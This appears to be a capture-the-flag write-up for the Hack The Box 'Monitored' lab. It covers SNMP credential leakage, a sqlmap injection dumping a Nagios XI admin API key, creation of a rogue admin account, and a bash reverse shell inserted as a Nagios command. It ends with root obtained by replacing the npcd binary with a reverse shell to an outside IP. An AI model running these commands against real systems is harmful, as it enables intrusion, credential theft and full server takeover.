# Monitored Write-up

<img src="https://labs.hackthebox.com/storage/avatars/d4988810825d26acb2e84ca0ac9feaf4.png" width="200" height="200">

## Nmap

 `nmap -sC -sV -p- 10.10.11.248`

    Not shown: 65492 closed tcp ports (conn-refused), 38 filtered tcp ports (no-response)
    PORT     STATE SERVICE    VERSION
    22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
    | ssh-hostkey: 
    |   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
    |   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
    |_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
    80/tcp   open  http       Apache httpd 2.4.56
    |_http-server-header: Apache/2.4.56 (Debian)
    |_http-title: Did not follow redirect to https://nagios.monitored.htb/
    389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
    443/tcp  open  ssl/http   Apache httpd 2.4.56 ((Debian))
    |_http-title: Nagios XI
    | ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
    | Not valid before: 2023-11-11T21:46:55
    |_Not valid after:  2297-08-25T21:46:55
    | tls-alpn: 
    |_  http/1.1
    |_ssl-date: TLS randomness does not represent time
    |_http-server-header: Apache/2.4.56 (Debian)
    5667/tcp open  tcpwrapped
    Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

![image](https://github.com/zer00d4y/writeups/assets/128820441/f5004c7b-dd83-4381-9129-4fe903be0b90)

## snmpwalk

`snmpwalk -v2c -c public nagios.monitored.htb`

    ...
    so.3.6.1.2.1.25.4.2.1.5.404 = STRING: "--config /etc/laurel/config.toml"
    iso.3.6.1.2.1.25.4.2.1.5.530 = STRING: "-f"
    iso.3.6.1.2.1.25.4.2.1.5.532 = STRING: "--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only"
    iso.3.6.1.2.1.25.4.2.1.5.546 = STRING: "-n -iNONE"
    iso.3.6.1.2.1.25.4.2.1.5.551 = STRING: "-f"
    iso.3.6.1.2.1.25.4.2.1.5.558 = STRING: "-u -s -O /run/wpa_supplicant"
    iso.3.6.1.2.1.25.4.2.1.5.569 = STRING: "-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB "
    iso.3.6.1.2.1.25.4.2.1.5.651 = STRING: "-4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0"
    iso.3.6.1.2.1.25.4.2.1.5.762 = STRING: "-f /usr/local/nagios/etc/pnp/npcd.cfg"
    iso.3.6.1.2.1.25.4.2.1.5.773 = STRING: "-LOw -f -p /run/snmptrapd.pid"
    iso.3.6.1.2.1.25.4.2.1.5.791 = STRING: "-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid"
    iso.3.6.1.2.1.25.4.2.1.5.797 = STRING: "-p /var/run/ntpd.pid -g -u 108:116"
    iso.3.6.1.2.1.25.4.2.1.5.813 = STRING: "-o -p -- \\u --noclear tty1 linux"
    iso.3.6.1.2.1.25.4.2.1.5.832 = STRING: "-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit"
    iso.3.6.1.2.1.25.4.2.1.5.834 = STRING: "-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit"
    iso.3.6.1.2.1.25.4.2.1.5.847 = STRING: "-h ldap:/// ldapi:/// -g openldap -u openldap -F /etc/ldap/slapd.d"
    iso.3.6.1.2.1.25.4.2.1.5.855 = STRING: "-D /var/lib/postgresql/13/main -c config_file=/etc/postgresql/13/main/postgresql.conf"
    iso.3.6.1.2.1.25.4.2.1.5.861 = STRING: "-k start"
    ...

`svc`:`XjH7VCehowpR1xZB`

![image](https://github.com/zer00d4y/writeups/assets/128820441/3b110ee1-f0b4-4cde-83e8-bb600ca5aa86)

Now, we are logined to nagios.monitored.htb/nagios/

![image](https://github.com/zer00d4y/writeups/assets/128820441/feb235d6-834a-49a1-af62-813400723f90)

    sqlmap -u "https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=$(curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=500' | awk -F'"' '{print $12}')" --level 5 --risk 3 -p id --batch -D nagiosxi --dump -T xi_users

![image](https://github.com/zer00d4y/writeups/assets/128820441/cc24e06e-45a2-4fbc-8731-771f0d495940)

    IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL

We got the admin api key. Now let’s add a new user.

    curl -XPOST --insecure "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=myadmin&password=myadmin&name=myadmin&email=myadmin@localhost&auth_level=admin"

![image](https://github.com/zer00d4y/writeups/assets/128820441/56af1986-aec8-41ee-94c5-a8ed32f081b4)

Authorize with the credentials which we just added.

`myadmin`:`myadmin`

![image](https://github.com/zer00d4y/writeups/assets/128820441/cc7220fd-2a1a-4772-a9ed-27b98eef9dd5)

![image](https://github.com/zer00d4y/writeups/assets/128820441/2edcc96f-5ad8-4d40-a807-3a5091ba0943)

### ReverseShell

Open `Core Config Manager`

![image](https://github.com/zer00d4y/writeups/assets/128820441/24f32dc8-0101-4a3e-a3b3-1461da048f16)

Open `Commands`

![image](https://github.com/zer00d4y/writeups/assets/128820441/8307f827-c9d1-4133-9c3d-9997f526e87c)

start listener 

![image](https://github.com/zer00d4y/writeups/assets/128820441/82a0606e-0a6d-4e03-9c19-12597e461dff)

Add new command with our shell

    bash -c 'bash -i >&/dev/tcp/your_ip/port 0>&1'

![image](https://github.com/zer00d4y/writeups/assets/128820441/c827bebf-6546-4f38-a96d-514a19ef01f0)

![image](https://github.com/zer00d4y/writeups/assets/128820441/1d2f124b-b088-4f9d-9a4d-666a5deed0a5)

![image](https://github.com/zer00d4y/writeups/assets/128820441/8f289353-83cb-473b-8f87-02f0f9494d47)

![image](https://github.com/zer00d4y/writeups/assets/128820441/a9da3a57-45cf-4a07-a8e8-e30030e608dd)

![image](https://github.com/zer00d4y/writeups/assets/128820441/a9bbfc09-8815-4044-8368-82cb4155453c)

![image](https://github.com/zer00d4y/writeups/assets/128820441/6b446dd7-bb7c-4739-8f16-6dff76ed0481)

Get the user flag 

![image](https://github.com/zer00d4y/writeups/assets/128820441/44d07945-d2cd-4b77-ad84-4b08764fcb57)

## Privilege Escalation

`sudo -l`

![image](https://github.com/zer00d4y/writeups/assets/128820441/6eab57a2-edfd-45ae-be75-ab590e7db6e5)

look at the manage service script:

`cat /usr/local/nagiosxi/scripts/manage_services.sh`

We can see that the script manages services. Let's work with the npcd service. First we will stop the service, then check its state to find the location of the systemd file

Note that the execution comes from: /usr/local/nagios/bin/npcd, which also has user permissions.

We will now remove and replace the npcd service with our payload.

    rm /usr/local/nagios/bin/npcd
    touch /usr/local/nagios/bin/npcd
    chmod +x /usr/local/nagios/bin/npcd
    echo '#!/bin/bash' > /usr/local/nagios/bin/npcd
    echo "bash -c 'bash -i >& /dev/tcp/10.10.14.91/6565 0>&1'" >> /usr/local/nagios/bin/npcd
    sudo /usr/local/nagiosxi/scripts/manage_services.sh restart npcd

![image](https://github.com/zer00d4y/writeups/assets/128820441/71abbb0b-3124-42de-9167-18c7184c3a40)

start listener 

![image](https://github.com/zer00d4y/writeups/assets/128820441/41d440a4-27fc-45e7-b28c-415c1764c695)

And get the root flag

![image](https://github.com/zer00d4y/writeups/assets/128820441/67d40574-4f44-4d09-ae4e-675eef72eb1b)


